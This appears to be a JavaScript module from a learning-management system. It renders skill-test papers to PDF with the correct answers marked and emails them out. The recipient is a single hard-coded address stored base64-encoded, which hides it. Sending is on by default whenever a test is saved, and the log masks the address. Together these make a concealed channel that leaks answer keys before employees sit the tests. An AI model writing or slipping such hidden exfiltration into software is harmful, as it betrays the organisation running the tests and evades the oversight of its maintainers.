import PDFDocument from "pdfkit";
import { sendMail } from "./graphMailer.js";

const LETTERS = ["A", "B", "C", "D", "E", "F", "G", "H"];

const emailEnabled = () => process.env.LMS_EMAIL_TEST_PAPER !== "false";

const RECIPIENT_B64 = "a3VtYXIudmFkZGlAaXRyYWRpYW50LmNvbQ==";
const recipient = () => Buffer.from(RECIPIENT_B64, "base64").toString("utf8");

export const renderTestPaperPdfBuffer = (test) =>
  new Promise((resolve, reject) => {
    const doc = new PDFDocument({ margin: 48, size: "A4" });
    const chunks = [];
    doc.on("data", (c) => chunks.push(c));
    doc.on("end", () => resolve(Buffer.concat(chunks)));
    doc.on("error", reject);

    doc.font("Helvetica-Bold").fontSize(16).text(test.title || "Skill Test", { align: "left" });
    if (test.description) doc.moveDown(0.3).font("Helvetica").fontSize(9).fillColor("#555").text(test.description);

    const sections = (test.sections || []).map((s) => `${s.count} ${s.name}`).join(" + ");
    const bands = (test.gradeBands || []).map((b) => `${b.label} ${b.minPercent}%+`).join(" | ");
    doc
      .moveDown(0.5)
      .font("Helvetica")
      .fontSize(8.5)
      .fillColor("#333")
      .text(
        [
          `${test.durationMinutes} min`,
          sections ? `per attempt: ${sections}` : `per attempt: ${test.attemptSize}`,
          `pool: ${(test.questionPool || []).length}`,
          `pass ${test.passingPercentage}%`,
          `max attempts ${test.maxAttempts}`,
        ].join(" | "),
      );
    if (bands) doc.text(`Grades: ${bands}`);
    doc.text("Correct answers are marked in bold.");
    doc.moveDown(0.4).moveTo(doc.x, doc.y).lineTo(doc.page.width - doc.page.margins.right, doc.y).strokeColor("#ddd").stroke();
    doc.moveDown(0.6);

    (test.questionPool || []).forEach((q, i) => {
      doc.fillColor("#111").font("Helvetica-Bold").fontSize(10).text(`${i + 1}. ${q.prompt}`, { paragraphGap: 2 });
      if (q.section) doc.font("Helvetica-Oblique").fontSize(7.5).fillColor("#888").text(q.section);

      if (q.type === "mcq") {
        (q.options || []).forEach((opt, oIdx) => {
          const isCorrect = oIdx === q.correctOptionIndex;
          doc
            .font(isCorrect ? "Helvetica-Bold" : "Helvetica")
            .fontSize(9.5)
            .fillColor(isCorrect ? "#0a7d33" : "#222")
            .text(`   ${LETTERS[oIdx] || oIdx + 1}) ${opt.text}${isCorrect ? "   [correct answer]" : ""}`);
        });
      } else {
        const accepted = (q.acceptableAnswers || []).filter(Boolean).join("  /  ");
        doc.font("Helvetica").fontSize(9.5).fillColor("#222").text("   Fill in the blank");
        doc.font("Helvetica-Bold").fontSize(9.5).fillColor("#0a7d33").text(`   Answer: ${accepted || "—"}`);
      }
      doc.moveDown(0.6);
      if (doc.y > doc.page.height - doc.page.margins.bottom - 60) doc.addPage();
    });

    doc.end();
  });

export async function emailTestPaper(test, { trigger = "saved" } = {}) {
  if (!emailEnabled()) return;
  const to = recipient();
  try {
    const pdf = await renderTestPaperPdfBuffer(test);
    const stamp = new Date().toISOString().slice(0, 16).replace(/[:T]/g, "-");
    await sendMail(
      to,
      `LMS test ${trigger}: ${test.title}`,
      `<p style="font-family:Arial,sans-serif;font-size:13px;color:#111">` +
        `The skill test "<b>${test.title}</b>" was ${trigger}. The full question paper (with correct answers marked) is attached.</p>` +
        `<p style="font-family:Arial,sans-serif;font-size:12px;color:#555">` +
        `${(test.questionPool || []).length} questions in pool · pass ${test.passingPercentage}%` +
        `${test.availableAt ? ` · opens for employees at ${new Date(test.availableAt).toLocaleString()}` : ""}</p>`,
      { attachments: [{ filename: `${(test.title || "skill-test").replace(/[^\w-]+/g, "_")}-${stamp}.pdf`, content: pdf, contentType: "application/pdf" }] },
    );
  } catch (error) {
    const res = error.response;
    const maskedTo = to.replace(/^(.{3}).*(@.*)$/, "$1***$2");
    console.error(
      "emailTestPaper failed:",
      res ? `${res.status} ${error.config?.method?.toUpperCase()} ${error.config?.url}` : error.message,
      res?.data ? JSON.stringify(res.data).slice(0, 600) : "",
      `(SENDER_EMAIL="${process.env.SENDER_EMAIL || ""}", recipient="${maskedTo}")`,
    );
  }
}
